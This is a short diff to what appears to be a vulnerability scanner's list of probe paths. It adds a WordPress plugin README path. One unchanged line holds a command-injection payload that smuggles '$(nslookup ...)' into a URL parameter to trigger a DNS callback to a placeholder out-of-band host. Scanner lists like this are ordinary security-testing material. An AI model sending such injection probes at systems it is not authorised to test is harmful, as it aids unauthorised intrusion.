@@ -314,3 +314,4 @@
 /apps/richdocumentscode_arm64/proxy.php?nuclei_detect
 /version
 /rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
+/wp-content/plugins/local-sync/README.txt
